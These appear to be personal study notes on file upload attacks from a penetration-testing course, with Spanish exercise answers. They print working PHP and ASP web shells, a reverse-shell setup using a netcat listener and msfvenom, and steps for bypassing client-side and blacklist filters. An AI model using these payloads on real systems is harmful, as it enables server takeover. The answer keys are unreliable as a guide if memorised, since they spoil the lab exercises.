# Intro to File Upload Attacks

Uploading user files has become a key feature for most modern web applications, enabling the extensibility of these applications with user-provided information. For instance:

- A social media website allows the upload of user profile images and other media.
- A corporate website may allow users to upload PDFs and other documents for corporate use.

However, enabling this feature introduces risks, as end-users can store potentially malicious data on the web application's back-end server. Without proper filtering and validation, attackers might exploit the file upload feature to execute arbitrary commands on the server and potentially take control of it.

File upload vulnerabilities are among the most common in web and mobile applications, as evidenced by the latest CVE reports. Many of these vulnerabilities are rated as **High** or **Critical**, underscoring the serious risks posed by insecure file uploads.

---

## Types of File Upload Attacks

### Weak File Validation and Verification

The primary cause of file upload vulnerabilities is weak or missing file validation and verification. The most severe form of this vulnerability is an **unauthenticated arbitrary file upload**, which allows any unauthenticated user to:

- Upload any file type.
- Execute code on the back-end server.

### Common Attacks

Even with file validation in place, insecure filters can often be bypassed, leading to vulnerabilities such as:

1. **Remote Command Execution**
   - Uploading a web shell: This allows the attacker to execute arbitrary commands and potentially gain an interactive shell to further exploit the network.
   - Uploading a script that sends a reverse shell: This enables interaction with the remote server via a listener on the attacker's machine.

2. **File-Type-Specific Attacks**
   - Exploiting the ability to upload specific file types when certain protections are missing.

### Other Potential Exploits

- **XSS or XXE Injection**: Introducing additional vulnerabilities through the uploaded files.
- **Denial of Service (DoS)**: Overloading the back-end server.
- **Overwriting System Files**: Altering critical system configurations.

### Use of Outdated Libraries

Vulnerabilities may also stem from outdated libraries used in the web application, which can expose the application to file upload attacks.

---

## Mitigating File Upload Vulnerabilities

At the end of this module, we will explore various tips and practices to secure web applications against common file upload attacks. Recommendations will include:

- Strong file validation and verification techniques.
- Regular updates to libraries and frameworks.
- Additional best practices to prevent file upload vulnerabilities.

By implementing these measures, developers can significantly reduce the risk posed by insecure file uploads.

---

# Absent Validation

The most basic type of file upload vulnerability occurs when the web application does not have any form of validation filters on the uploaded files, allowing the upload of any file type by default.

With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.

---

## Arbitrary File Upload

### Example Scenario

Let’s start the exercise at the end of this section, where we encounter an Employee File Manager web application that allows users to upload personal files:

- **URL:** `http://SERVER_IP:PORT/`

The application does not specify allowed file types, and we can drag and drop any file, including `.php` files, which appear on the upload form. The file selector dialog also states "All Files" as the file type, suggesting no restrictions are applied.

This lack of restrictions indicates the potential to upload arbitrary file types, which could allow us to exploit the back-end server.

### Identifying Web Framework

To test the ability to upload any file type and exploit the back-end server, we first identify the programming language used by the web application. 

#### Steps to Identify
1. **URL Inspection:**
   - Check the page extension in URLs (e.g., `.php`, `.asp`, `.aspx`).
   - Example: Visit `http://SERVER_IP:PORT/index.php` to check if it’s a PHP application.

2. **Tools for Identification:**
   - Use tools like **Burp Intruder** with a Web Extensions wordlist for fuzzing file extensions.
   - Browser extensions like **Wappalyzer** to identify technologies in use.

3. **Alternative Methods:**
   - Run web scanners like **Burp/ZAP** or other Web Vulnerability Assessment tools.

#### Example Outcome
Using Wappalyzer or similar tools, we identify the web application runs on PHP and learn about the web server type, version, and back-end OS. Once identified, we prepare a malicious script written in PHP to exploit the application.

### Vulnerability Identification

After identifying the web framework, we test whether arbitrary files can be uploaded:

1. Create a test PHP file `test.php` with the content:
   ```php
   <?php echo "Hello HTB";?>
   ```

2. Upload `test.php` to the web application:
   - **URL:** `http://SERVER_IP:PORT/`
   - Confirm success: A message like "File successfully uploaded" appears.

3. Access the uploaded file:
   - **URL:** `http://SERVER_IP:PORT/uploads/test.php`
   - Outcome: The page displays `Hello HTB`, indicating successful execution of PHP code.

If the application were unable to execute PHP code, the source code would have been displayed instead.

---

In the next section, we will explore how to leverage this vulnerability to execute code on the back-end server and gain control over it.

Ejercicio1
  Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.
    ```<?php
      system("hostname");
    ?>```
    hacerlo en un .php subirlo y descargarlo

---

# Upload Exploitation

The final step in exploiting a vulnerable web application is uploading a malicious script written in the same language as the web application, such as a web shell or reverse shell script. Once the malicious script is uploaded, visiting its link allows interaction to gain control over the back-end server.

---

## Web Shells

Web shells provide features like directory traversal and file transfer. Examples include:

- **PHPBash**: A terminal-like semi-interactive web shell for PHP.
- **SecLists**: Contains various web shells for different frameworks and languages, found in the `/opt/useful/seclists/Web-Shells` directory on PwnBox.

### Uploading a Web Shell
1. Download a web shell for the language of the web application (e.g., `phpbash.php` for PHP).
2. Upload the web shell through the vulnerable upload feature.
3. Visit the uploaded file link (e.g., `http://SERVER_IP:PORT/uploads/phpbash.php`).

The web shell provides a terminal-like interface, simplifying enumeration and exploitation of the back-end server. Test other web shells from SecLists to find the most suitable one for your needs.

### Writing a Custom Web Shell
In cases where online tools are unavailable, writing a simple custom web shell is useful. For PHP:

```php
<?php system($_REQUEST['cmd']); ?>
```

- Save this script as `shell.php`.
- Upload it to the web application.
- Execute system commands using the `?cmd=` GET parameter (e.g., `http://SERVER_IP:PORT/uploads/shell.php?cmd=id`).

**Tip:** Use source-view mode (`CTRL+U`) in the browser to display command output in a terminal-like format without HTML rendering.

Other languages/frameworks can use similar techniques with their respective functions. For example, .NET web applications:

```asp
<% eval request('cmd') %>
```

Note: Web shells may fail due to security measures like firewalls or disabled server functions.

---

## Reverse Shells

Reverse shells offer an interactive method for controlling compromised servers. For PHP:

### Using Pre-Existing Scripts
1. Download a reverse shell script (e.g., the pentestmonkey PHP reverse shell from SecLists).
2. Edit the script to set your IP and listening port:

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

3. Start a netcat listener on your machine:

```bash
nc -lvnp OUR_PORT
```

4. Upload the script to the web application.
5. Visit its link to execute the script and establish a connection:

```bash
connect to [OUR_IP] from (UNKNOWN) [BACKEND_IP] PORT
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Generating Custom Reverse Shell Scripts
Use tools like `msfvenom` to create reverse shell scripts:

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

1. Start a netcat listener on the specified port.
2. Upload `reverse.php` and visit its link to establish the connection.

Reverse shell payloads can be generated for various languages by changing the `-p` and `-f` flags.

---

While reverse shells provide the most interactive control, they may fail due to firewalls or disabled server functions, making web shells a fallback option. Understanding both methods is critical for effective web exploitation.


Ejercicio2
  Try to exploit the upload feature to upload a web shell and get the content of /flag.txt
    ```<?php
          if (isset($_GET['cmd'])) {
            echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
          }
        ?>
        ```
        luego en la url hacer ?cmd= cat /flag.txt

---

## Client-Side Validation

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.

### Back-end Request Modification

1. Capture a normal request through Burp after selecting an image for upload.
2. Observe the standard HTTP request sent to the back-end (e.g., `/upload.php`).
3. Modify the `filename` and file content:
   - Change `filename="HTB.png"` to `filename="shell.php"`.
   - Replace the file content with your web shell content.
4. Send the modified request to the server.
5. Verify upload success and visit the uploaded file link to interact with your web shell.

### Disabling Front-end Validation

1. Open the browser's Page Inspector (`CTRL+SHIFT+C`) and locate the file input element.
2. Modify or remove client-side validation scripts:
   - Remove the `checkFile` function from the `onchange` attribute.
   - Optionally remove `accept=".jpg,.jpeg,.png"` to allow file selection without restrictions.
3. Save changes and use the upload functionality to upload your web shell.

**Note:** Changes made to the front-end are temporary and will not persist through page refreshes.

Once uploaded, use the Page Inspector to find the URL of the uploaded web shell, and visit it to execute commands on the back-end server:

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

Visit the link (e.g., `http://SERVER_IP:PORT/profile_images/shell.php?cmd=id`) to interact with the uploaded shell.

---

While reverse shells are always preferred over web shells for interactive control, understanding client-side validation bypass techniques is crucial for web exploitation scenarios.

Ejercicio3
  Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)
    Es sencillo, abrir burpsuite y con el codigo anterior hacerlo a .png y lkuego tras interceptarlo con burpsuite solo deberas ponerlo en .php y mandarlo y asi podras ejecutar codigo como el anterior'

---

# Blacklist Filters

In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.

Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

## Blacklisting Extensions

The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts. We will see why using a blacklist of common extensions may not be enough to prevent arbitrary file uploads and discuss several methods to bypass it.

### Example Code
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

### Observations:
- **Weakness:** The blacklist is not comprehensive. Many extensions can still be used to execute PHP code.
- **Case-Sensitivity:** The comparison is case-sensitive, so mixed-case extensions like `pHp` might bypass the blacklist.

### Exploitation
1. **Fuzzing Extensions:**
   - Use tools like Burp Suite to fuzz the upload functionality with lists of potential extensions.
   - Tools and lists:
     - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
     - [SecLists](https://github.com/danielmiessler/SecLists)
   
2. **Steps:**
   - Intercept the request in Burp.
   - Replace the filename extension with a fuzzing payload.
   - Use Intruder to test for non-blacklisted extensions.
   - Analyze the results by sorting responses based on length or status messages.

3. **Identify Non-Blacklisted Extensions:**
   - Extensions not blocked by the blacklist may allow code execution.
   - Common example: `.phtml`

4. **Upload and Execute PHP Shell:**
   - Modify the filename to use an allowed extension (e.g., `shell.phtml`).
   - Update the file content to include a PHP shell.
   - Verify the file upload directory (e.g., `/profile_images`).
   - Access the uploaded file and execute commands to confirm the bypass.

### Key Learnings:
- Blacklists are inherently limited and prone to bypass.
- Whitelisting extensions and performing server-side content validation is a more robust approach.
- Always test file uploads thoroughly for potential vulnerabilities.

### Tools and Resources:
- Burp Suite
- PayloadsAllTheThings
- SecLists


Ejercicio4
  Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"
    
